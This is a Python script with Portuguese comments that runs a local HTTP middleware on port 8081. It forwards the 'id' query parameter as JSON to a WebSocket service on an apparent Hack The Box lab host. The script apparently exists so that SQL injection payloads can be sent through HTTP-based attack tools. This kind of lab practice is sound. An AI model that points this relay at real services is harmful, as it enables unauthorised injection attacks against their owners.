# Importa classes para criar servidor HTTP e trabalhar com requisições e URLs
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection  # Biblioteca websocket-client para comunicação via WebSocket

# URL do servidor WebSocket alvo
ws_server = "ws://soc-player.soccer.htb:9091"

# Função que envia uma mensagem via WebSocket e retorna a resposta
def send_ws(payload):
	ws = create_connection(ws_server)  # Estabelece conexão com o servidor WebSocket

	# Descomente abaixo se for necessário receber uma mensagem inicial (ex: token de autenticação)
	# resp = ws.recv()

	# Decodifica a string da URL (ex: %20 vira espaço) e troca aspas duplas por simples para evitar quebra de estrutura JSON
	message = unquote(payload).replace('"','\'')  
	data = '{"id":"%s"}' % message  # Monta o JSON com o payload como valor do campo "id"

	ws.send(data)            # Envia o JSON para o servidor WebSocket
	resp = ws.recv()         # Aguarda resposta
	ws.close()               # Fecha conexão

	# Retorna a resposta recebida ou string vazia se nada for retornado
	if resp:
		return resp
	else:
		return ''

# Função que inicia um servidor HTTP simples para atuar como middleware
def middleware_server(host_port, content_type="text/plain"):

	# Define uma classe de handler personalizada que processa requisições GET
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)  # Responde com status HTTP 200 (OK)

			# Tenta extrair o valor do parâmetro "id" da URL (ex: /?id=valor)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False

			# Se tiver um payload, envia via WebSocket e recebe a resposta
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'  # Se não houver parâmetro, responde com aviso

			self.send_header("Content-type", content_type)  # Define o tipo de conteúdo da resposta
			self.end_headers()
			self.wfile.write(content.encode())  # Escreve a resposta no corpo da requisição
			return

	# Cria uma subclasse de TCPServer que permite reutilizar o endereço (evita erro "address already in use")
	class _TCPServer(TCPServer):
		allow_reuse_address = True

	# Instancia e inicia o servidor com o handler personalizado
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()  # Mantém o servidor em execução até ser interrompido

# Mensagens informativas ao iniciar o servidor
print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

# Executa o servidor HTTP na porta 8081, ouvindo em todas as interfaces
try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass  # Permite encerrar o servidor com Ctrl+C sem erro
